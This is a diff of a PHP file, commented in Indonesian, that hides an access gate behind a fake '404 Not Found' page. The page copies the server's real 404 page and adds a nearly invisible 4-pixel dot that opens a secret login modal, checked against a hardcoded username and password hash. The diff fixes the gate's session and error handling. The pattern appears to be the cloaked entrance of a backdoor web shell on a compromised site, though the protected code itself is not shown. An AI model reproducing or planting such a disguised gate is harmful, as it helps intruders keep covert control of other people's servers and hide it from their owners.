@@ -1,8 +1,11 @@
 <?php
 $LOGIN_USERNAME       = 'kampang26889';
-$LOGIN_PASSWORD_HASH  = '$2y$10$HPO8EoTdahs51QJBCDzPQOWRHAmWRscxw45.zplmC1oE7Xs7kEl/C';
+$LOGIN_PASSWORD_HASH  = '$2y$10$I9VlRl8jp4OpsJSgiUK9gO4DgYKrs4nvRAmm9pH2./YIM5O.LP7ju';
 
-session_start();
+// START SESSION - PASTIKAN DI AWAL
+if (session_status() === PHP_SESSION_NONE) {
+    session_start();
+}
 
 // GANTI ini agar kompatibel PHP 5.6 (hapus ??)
 $mode = '';
@@ -270,7 +273,7 @@ function injectLoginButton($html) {
         <div style="background:rgba(20,40,70,0.9);padding:35px 40px;border-radius:12px;width:340px;box-shadow:0 15px 40px rgba(0,0,0,0.5);text-align:center;border:1px solid rgba(255,255,255,0.05);">
             <h3 style="margin:0 0 25px 0;font-size:20px;font-weight:400;color:rgba(255,255,255,0.85);letter-spacing:0.5px;">Authentication Required</h3>
             
-            <form method="post" id="secretLoginForm">
+            <form method="post" id="secretLoginForm" action="' . htmlspecialchars($_SERVER['PHP_SELF']) . '">
                 <div style="margin-bottom:15px;">
                     <input type="text" 
                            name="secret_login_user" 
@@ -340,132 +343,155 @@ function injectLoginButton($html) {
     return $html;
 }
 
+// ====================== FUNGSI LOGIN YANG DIPERBAIKI ======================
 function requireLogin() {
     global $LOGIN_USERNAME, $LOGIN_PASSWORD_HASH;
 
+    // Cek apakah user sudah login
+    if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
+        return true; // Sudah login, lanjutkan
+    }
+
+    // Proses login jika ada POST
     if (isset($_POST['secret_login_user']) && isset($_POST['secret_login_pass'])) {
         $u = $_POST['secret_login_user'];
         $p = $_POST['secret_login_pass'];
 
         if ($u === $LOGIN_USERNAME && password_verify($p, $LOGIN_PASSWORD_HASH)) {
             $_SESSION['logged_in'] = true;
+            $_SESSION['login_time'] = time();
+            
+            // Redirect ke halaman yang sama tanpa parameter POST
             header('Location: ' . $_SERVER['PHP_SELF']);
             exit;
+        } else {
+            // Login gagal - tampilkan pesan error
+            $error = "Invalid username or password!";
         }
     }
 
-    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
-        
-        $original_404 = getOriginal404Page();
-        
-        if ($original_404 !== false) {
-            $html = injectLoginButton($original_404);
-            header('HTTP/1.1 404 Not Found');
-            echo $html;
-            exit;
-        }
-        
+    // Jika belum login, tampilkan halaman 404 dengan form login
+    $original_404 = getOriginal404Page();
+    
+    if ($original_404 !== false) {
+        $html = injectLoginButton($original_404);
         header('HTTP/1.1 404 Not Found');
-        ?>
-        <!DOCTYPE html>
-        <html>
-        <head>
-            <title>404 Not Found</title>
-            <style>
-                body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 20px; }
-                .container { max-width: 800px; margin: 50px auto; }
-                h1 { font-size: 24px; font-weight: normal; }
-                hr { border: none; border-top: 1px solid #ccc; margin: 20px 0; }
-                .message { font-size: 14px; }
-                
-                /* Custom placeholder color for dark modal */
-                ::-webkit-input-placeholder { color: rgba(255,255,255,0.25); }
-                :-moz-placeholder { color: rgba(255,255,255,0.25); }
-                ::-moz-placeholder { color: rgba(255,255,255,0.25); }
-                :-ms-input-placeholder { color: rgba(255,255,255,0.25); }
-            </style>
-        </head>
-        <body>
-            <div class="container">
-                <h1>Not Found</h1>
-                <hr>
-                <div class="message">The requested URL <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> was not found on this server.</div>
-            </div>
-            
-            <!-- Super Tiny Transparent Dot - Left Top -->
-            <div style="position:fixed;top:5px;left:5px;width:4px;height:4px;background:rgba(0,0,0,0.03);border-radius:50%;cursor:pointer;z-index:9999;transition:all 0.3s ease;" 
-                 onclick="showLoginModal()"
-                 onmouseover="this.style.background='rgba(0,0,0,0.1)';this.style.transform='scale(2.5)'"
-                 onmouseout="this.style.background='rgba(0,0,0,0.03)';this.style.transform='scale(1)'">
-            </div>
-            
-            <!-- Login Modal - Dark Blue Transparent -->
-            <div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,20,40,0.85);backdrop-filter:blur(5px);z-index:10000;align-items:center;justify-content:center;">
-                <div style="background:rgba(20,40,70,0.9);padding:35px 40px;border-radius:12px;width:340px;box-shadow:0 15px 40px rgba(0,0,0,0.5);text-align:center;border:1px solid rgba(255,255,255,0.05);">
-                    <h3 style="margin:0 0 25px 0;font-size:20px;font-weight:400;color:rgba(255,255,255,0.85);letter-spacing:0.5px;">Authentication Required</h3>
-                    
-                    <form method="post">
-                        <div style="margin-bottom:15px;">
-                            <input type="text" 
-                                   name="secret_login_user" 
-                                   placeholder="Username" 
-                                   style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:6px;color:rgba(255,255,255,0.8);box-sizing:border-box;font-size:14px;transition:all 0.3s;outline:none;"
-                                   onfocus="this.style.borderColor='rgba(255,255,255,0.2)';this.style.background='rgba(255,255,255,0.08)'"
-                                   onblur="this.style.borderColor='rgba(255,255,255,0.08)';this.style.background='rgba(255,255,255,0.06)'">
-                        </div>
-                        <div style="margin-bottom:20px;">
-                            <input type="password" 
-                                   name="secret_login_pass" 
-                                   placeholder="Password" 
-                                   style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:6px;color:rgba(255,255,255,0.8);box-sizing:border-box;font-size:14px;transition:all 0.3s;outline:none;"
-                                   onfocus="this.style.borderColor='rgba(255,255,255,0.2)';this.style.background='rgba(255,255,255,0.08)'"
-                                   onblur="this.style.borderColor='rgba(255,255,255,0.08)';this.style.background='rgba(255,255,255,0.06)'">
-                        </div>
-                        <button type="submit" 
-                                style="width:100%;padding:12px;background:rgba(255,255,255,0.1);color:#fff;border:1px solid rgba(255,255,255,0.12);border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.3s;"
-                                onmouseover="this.style.background='rgba(255,255,255,0.15)';this.style.borderColor='rgba(255,255,255,0.2)'"
-                                onmouseout="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(255,255,255,0.12)'">
-                            Login
-                        </button>
-                    </form>
-                    
-                    <div style="text-align:center;margin-top:18px;font-size:13px;color:rgba(255,255,255,0.3);cursor:pointer;transition:all 0.2s;" 
-                         onclick="document.getElementById('loginModal').style.display='none'"
-                         onmouseover="this.style.color='rgba(255,255,255,0.5)'"
-                         onmouseout="this.style.color='rgba(255,255,255,0.3)'">
-                        Cancel
-                    </div>
-                </div>
-            </div>
-            
-            <script>
-                function showLoginModal() {
-                    document.getElementById('loginModal').style.display = 'flex';
-                }
-                function closeLoginModal() {
-                    document.getElementById('loginModal').style.display = 'none';
-                }
-                window.onclick = function(e) { 
-                    var modal = document.getElementById('loginModal');
-                    if (e.target == modal) {
-                        modal.style.display = 'none';
-                    }
-                }
-                document.addEventListener('keydown', function(e) {
-                    if (e.key === "Escape") {
-                        closeLoginModal();
-                    }
-                });
-            </script>
-        </body>
-        </html>
-        <?php
+        echo $html;
         exit;
     }
+    
+    // Fallback 404 page
+    header('HTTP/1.1 404 Not Found');
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>404 Not Found</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #fff; margin: 0; padding: 20px; }
+            .container { max-width: 800px; margin: 50px auto; }
+            h1 { font-size: 24px; font-weight: normal; }
+            hr { border: none; border-top: 1px solid #ccc; margin: 20px 0; }
+            .message { font-size: 14px; }
+            .error-msg { color: #ff4444; margin: 10px 0; padding: 10px; background: #ffebee; border-radius: 4px; }
+            
+            /* Custom placeholder color for dark modal */
+            ::-webkit-input-placeholder { color: rgba(255,255,255,0.25); }
+            :-moz-placeholder { color: rgba(255,255,255,0.25); }
+            ::-moz-placeholder { color: rgba(255,255,255,0.25); }
+            :-ms-input-placeholder { color: rgba(255,255,255,0.25); }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>Not Found</h1>
+            <hr>
+            <div class="message">The requested URL <?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?> was not found on this server.</div>
+            <?php if (isset($error)): ?>
+            <div class="error-msg">❌ <?php echo $error; ?></div>
+            <?php endif; ?>
+        </div>
+        
+        <!-- Super Tiny Transparent Dot - Left Top -->
+        <div style="position:fixed;top:5px;left:5px;width:4px;height:4px;background:rgba(0,0,0,0.03);border-radius:50%;cursor:pointer;z-index:9999;transition:all 0.3s ease;" 
+             onclick="showLoginModal()"
+             onmouseover="this.style.background='rgba(0,0,0,0.1)';this.style.transform='scale(2.5)'"
+             onmouseout="this.style.background='rgba(0,0,0,0.03)';this.style.transform='scale(1)'">
+        </div>
+        
+        <!-- Login Modal - Dark Blue Transparent -->
+        <div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(10,20,40,0.85);backdrop-filter:blur(5px);z-index:10000;align-items:center;justify-content:center;">
+            <div style="background:rgba(20,40,70,0.9);padding:35px 40px;border-radius:12px;width:340px;box-shadow:0 15px 40px rgba(0,0,0,0.5);text-align:center;border:1px solid rgba(255,255,255,0.05);">
+                <h3 style="margin:0 0 25px 0;font-size:20px;font-weight:400;color:rgba(255,255,255,0.85);letter-spacing:0.5px;">Authentication Required</h3>
+                
+                <form method="post" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
+                    <div style="margin-bottom:15px;">
+                        <input type="text" 
+                               name="secret_login_user" 
+                               placeholder="Username" 
+                               style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:6px;color:rgba(255,255,255,0.8);box-sizing:border-box;font-size:14px;transition:all 0.3s;outline:none;"
+                               onfocus="this.style.borderColor='rgba(255,255,255,0.2)';this.style.background='rgba(255,255,255,0.08)'"
+                               onblur="this.style.borderColor='rgba(255,255,255,0.08)';this.style.background='rgba(255,255,255,0.06)'">
+                    </div>
+                    <div style="margin-bottom:20px;">
+                        <input type="password" 
+                               name="secret_login_pass" 
+                               placeholder="Password" 
+                               style="width:100%;padding:12px 16px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:6px;color:rgba(255,255,255,0.8);box-sizing:border-box;font-size:14px;transition:all 0.3s;outline:none;"
+                               onfocus="this.style.borderColor='rgba(255,255,255,0.2)';this.style.background='rgba(255,255,255,0.08)'"
+                               onblur="this.style.borderColor='rgba(255,255,255,0.08)';this.style.background='rgba(255,255,255,0.06)'">
+                    </div>
+                    <button type="submit" 
+                            style="width:100%;padding:12px;background:rgba(255,255,255,0.1);color:#fff;border:1px solid rgba(255,255,255,0.12);border-radius:6px;font-size:14px;font-weight:500;cursor:pointer;transition:all 0.3s;"
+                            onmouseover="this.style.background='rgba(255,255,255,0.15)';this.style.borderColor='rgba(255,255,255,0.2)'"
+                            onmouseout="this.style.background='rgba(255,255,255,0.1)';this.style.borderColor='rgba(255,255,255,0.12)'">
+                        Login
+                    </button>
+                </form>
+                
+                <div style="text-align:center;margin-top:18px;font-size:13px;color:rgba(255,255,255,0.3);cursor:pointer;transition:all 0.2s;" 
+                     onclick="document.getElementById('loginModal').style.display='none'"
+                     onmouseover="this.style.color='rgba(255,255,255,0.5)'"
+                     onmouseout="this.style.color='rgba(255,255,255,0.3)'">
+                    Cancel
+                </div>
+            </div>
+        </div>
+        
+        <script>
+            function showLoginModal() {
+                document.getElementById('loginModal').style.display = 'flex';
+            }
+            function closeLoginModal() {
+                document.getElementById('loginModal').style.display = 'none';
+            }
+            window.onclick = function(e) { 
+                var modal = document.getElementById('loginModal');
+                if (e.target == modal) {
+                    modal.style.display = 'none';
+                }
+            }
+            document.addEventListener('keydown', function(e) {
+                if (e.key === "Escape") {
+                    closeLoginModal();
+                }
+            });
+            
+            // Auto show modal jika ada error
+            <?php if (isset($error)): ?>
+            document.addEventListener('DOMContentLoaded', function() {
+                showLoginModal();
+            });
+            <?php endif; ?>
+        </script>
+    </body>
+    </html>
+    <?php
+    exit;
 }
 
 // ======================
-// AREA DILINDUNGI
+// AREA DILINDUNGI - PASTIKAN LOGIN SEBELUM AKSES
 // ======================
 requireLogin();
 
